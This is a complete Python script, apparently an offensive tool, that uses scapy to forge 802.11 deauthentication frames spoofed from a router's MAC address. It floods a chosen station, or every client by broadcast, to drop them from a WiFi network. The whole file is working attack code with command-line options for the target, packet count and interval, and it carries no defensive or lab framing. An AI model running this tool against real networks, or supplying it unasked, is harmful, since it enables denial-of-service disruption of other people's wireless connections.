import scapy.all as scapy
import time
import argparse
import sys
import signal

class WifiJammer:
    def __init__(self, target_mac, gateway_mac, interface, interval=0.1, count=None):
        self.target_mac = target_mac
        self.gateway_mac = gateway_mac
        self.interface = interface
        self.interval = interval
        self.count = count
        self.packets_sent = 0

    def craft_packet(self):
        # 802.11 Frame Construction
        # addr1 = Destination (Target), addr2 = Source (Gateway - Spoofed), addr3 = BSSID (Gateway)
        dot11 = scapy.Dot11(addr1=self.target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac)
        
        # Management Frame: Deauthentication (subtype 12)
        # Reason 7: Class 3 frame received from nonassociated station
        packet = scapy.RadioTap() / dot11 / scapy.Dot11Deauth(reason=7)
        return packet

    def attack(self):
        print(f"[*] Starting Deauth Attack on {self.target_mac} via {self.interface}...")
        print(f"[*] Gateway: {self.gateway_mac}")
        print(f"[*] Interval: {self.interval}s")
        if self.count:
            print(f"[*] Count limit: {self.count}")
        
        packet = self.craft_packet()
        
        # Handle Ctrl+C gracefully
        def signal_handler(sig, frame):
            print(f"\n[-] Attack Stopped. Total packets sent: {self.packets_sent}")
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)

        try:
            while True:
                if self.count and self.packets_sent >= self.count:
                    print(f"\n[+] Reached packet count limit ({self.count}). Stopping.")
                    break

                scapy.sendp(packet, iface=self.interface, count=1, verbose=False)
                self.packets_sent += 1
                print(f"\r[+] Packets sent: {self.packets_sent} | Target: {self.target_mac}", end="")
                time.sleep(self.interval)
                
        except Exception as e:
            print(f"\n[!] Error: {e}")

def get_arguments():
    parser = argparse.ArgumentParser(description="WiFi Deauthentication Tool (Jammer)")
    parser.add_argument("-t", "--target", dest="target_mac", help="Target MAC Address (Station). Use 'ff:ff:ff:ff:ff:ff' for broadcast.")
    parser.add_argument("-g", "--gateway", dest="gateway_mac", required=True, help="Gateway MAC Address (BSSID/Router)")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Wireless Interface (Must be in Monitor Mode)")
    parser.add_argument("--broadcast", action="store_true", help="Set target to broadcast (ff:ff:ff:ff:ff:ff)")
    parser.add_argument("-c", "--count", dest="count", type=int, help="Number of packets to send (Default: Infinite)")
    parser.add_argument("--interval", dest="interval", type=float, default=0.1, help="Interval between packets in seconds (Default: 0.1)")
    
    args = parser.parse_args()
    
    if not args.target_mac and not args.broadcast:
        parser.error("[-] Please specify a target MAC (-t) or use broadcast mode (--broadcast).")
        
    if args.broadcast:
        args.target_mac = "ff:ff:ff:ff:ff:ff"
        
    return args

if __name__ == "__main__":
    args = get_arguments()
    
    jammer = WifiJammer(
        target_mac=args.target_mac, 
        gateway_mac=args.gateway_mac, 
        interface=args.interface,
        interval=args.interval,
        count=args.count
    )
    jammer.attack()